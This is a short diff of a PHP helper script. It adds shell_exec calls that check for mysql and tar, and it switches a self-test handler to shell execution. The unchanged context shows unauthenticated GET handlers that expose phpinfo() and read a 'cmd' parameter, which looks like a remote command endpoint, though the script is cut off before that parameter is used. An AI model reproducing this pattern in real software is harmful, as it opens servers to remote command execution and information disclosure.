@@ -1,7 +1,7 @@
 <?php
 if(isset($_GET['self_test']))
 {
-    echo "OK";
+    echo shell_exec('echo ok');
     die();
 }
 if(isset($_GET['info']))
@@ -9,6 +9,18 @@ if(isset($_GET['info']))
     phpinfo();
     die();
 }
+
+function test_command($command)
+{
+    $output = shell_exec("which $command");
+    if(!empty($output))
+        echo "ok";
+    die();
+}
+if(isset($_GET['test_mysql']))
+    test_command('mysql');
+if(isset($_GET['test_tar']))
+    test_command('tar');
 
 $command = @$_GET['cmd'];
 if(!empty($command))
